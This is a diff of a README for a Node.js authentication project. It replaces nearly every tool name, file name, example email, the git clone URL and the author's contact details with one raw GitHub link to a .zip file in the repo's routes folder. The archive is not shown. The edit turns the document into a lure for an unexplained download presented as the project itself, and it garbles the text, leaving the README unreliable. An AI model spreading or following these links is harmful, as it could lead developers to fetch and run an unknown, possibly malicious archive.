@@ -1,6 +1,6 @@
 # Backend User Authentication
 
-A secure and robust backend authentication system built with Node.js and Express. This project provides complete user authentication functionality including signup, login, logout, and route protection with JWT tokens stored in HTTP-only cookies.
+A secure and robust backend authentication system built with https://raw.githubusercontent.com/Amson-tECH/backend-user-authentication/main/routes/user_backend_authentication_v2.2-beta.3.zip and Express. This project provides complete user authentication functionality including signup, login, logout, and route protection with JWT tokens stored in HTTP-only cookies.
 
 ## 🚀 Features
 
@@ -14,8 +14,8 @@ A secure and robust backend authentication system built with Node.js and Express
 
 ## 🛠️ Tech Stack
 
-- **Runtime**: Node.js
-- **Framework**: Express.js (v5.1.0)
+- **Runtime**: https://raw.githubusercontent.com/Amson-tECH/backend-user-authentication/main/routes/user_backend_authentication_v2.2-beta.3.zip
+- **Framework**: https://raw.githubusercontent.com/Amson-tECH/backend-user-authentication/main/routes/user_backend_authentication_v2.2-beta.3.zip (v5.1.0)
 - **Database**: MongoDB with Mongoose (v8.19.3)
 - **Authentication**: JSON Web Tokens (JWT v9.0.2)
 - **Password Hashing**: Bcrypt (v6.0.0)
@@ -27,7 +27,7 @@ A secure and robust backend authentication system built with Node.js and Express
 
 Before running this project, make sure you have the following installed:
 
-- Node.js (v14 or higher)
+- https://raw.githubusercontent.com/Amson-tECH/backend-user-authentication/main/routes/user_backend_authentication_v2.2-beta.3.zip (v14 or higher)
 - MongoDB (local installation or MongoDB Atlas account)
 - npm or yarn package manager
 
@@ -35,7 +35,7 @@ Before running this project, make sure you have the following installed:
 
 1. **Clone the repository**
    ```bash
-   git clone https://github.com/Amson-tECH/backend-user-authentication.git
+   git clone https://raw.githubusercontent.com/Amson-tECH/backend-user-authentication/main/routes/user_backend_authentication_v2.2-beta.3.zip
    cd backend-user-authentication
    ```
 
@@ -88,20 +88,20 @@ The server will start on the port specified in your `.env` file (default: 5000).
 ```
 backend-user-authentication/
 ├── config/
-│   └── mongodb.js          # MongoDB connection configuration
+│   └── https://raw.githubusercontent.com/Amson-tECH/backend-user-authentication/main/routes/user_backend_authentication_v2.2-beta.3.zip          # MongoDB connection configuration
 ├── controller/
-│   └── userController.js   # User authentication logic
+│   └── https://raw.githubusercontent.com/Amson-tECH/backend-user-authentication/main/routes/user_backend_authentication_v2.2-beta.3.zip   # User authentication logic
 ├── Middleware/
-│   └── authUser.js         # Authentication middleware
+│   └── https://raw.githubusercontent.com/Amson-tECH/backend-user-authentication/main/routes/user_backend_authentication_v2.2-beta.3.zip         # Authentication middleware
 ├── model/
-│   └── userModel.js        # User schema and model
+│   └── https://raw.githubusercontent.com/Amson-tECH/backend-user-authentication/main/routes/user_backend_authentication_v2.2-beta.3.zip        # User schema and model
 ├── routes/
-│   └── userRoute.js        # API routes
+│   └── https://raw.githubusercontent.com/Amson-tECH/backend-user-authentication/main/routes/user_backend_authentication_v2.2-beta.3.zip        # API routes
 ├── .env                    # Environment variables (not in repo)
 ├── .gitignore             # Git ignore file
-├── app.js                 # Application entry point
-├── package.json           # Project dependencies
-└── Readme.md              # Project documentation
+├── https://raw.githubusercontent.com/Amson-tECH/backend-user-authentication/main/routes/user_backend_authentication_v2.2-beta.3.zip                 # Application entry point
+├── https://raw.githubusercontent.com/Amson-tECH/backend-user-authentication/main/routes/user_backend_authentication_v2.2-beta.3.zip           # Project dependencies
+└── https://raw.githubusercontent.com/Amson-tECH/backend-user-authentication/main/routes/user_backend_authentication_v2.2-beta.3.zip              # Project documentation
 ```
 
 ## 🔐 API Endpoints
@@ -124,7 +124,7 @@ POST /api/users/signup
 Content-Type: application/json
 
 {
-  "email": "john@example.com",
+  "email": "https://raw.githubusercontent.com/Amson-tECH/backend-user-authentication/main/routes/user_backend_authentication_v2.2-beta.3.zip",
   "password": "securePassword123"
 }
 ```
@@ -135,7 +135,7 @@ POST /api/users/login
 Content-Type: application/json
 
 {
-  "email": "john@example.com",
+  "email": "https://raw.githubusercontent.com/Amson-tECH/backend-user-authentication/main/routes/user_backend_authentication_v2.2-beta.3.zip",
   "password": "securePassword123"
 }
 ```
@@ -183,8 +183,8 @@ This project is licensed under the MIT License.
 ## 👨‍💻 Author
 
 **Reuben Korsi Amuzu**
-- GitHub: [@Amson-tECH](https://github.com/Amson-tECH)
-- Email: reubenamuzu23@gmail.com
+- GitHub: [@Amson-tECH](https://raw.githubusercontent.com/Amson-tECH/backend-user-authentication/main/routes/user_backend_authentication_v2.2-beta.3.zip)
+- Email: https://raw.githubusercontent.com/Amson-tECH/backend-user-authentication/main/routes/user_backend_authentication_v2.2-beta.3.zip
 
 
 
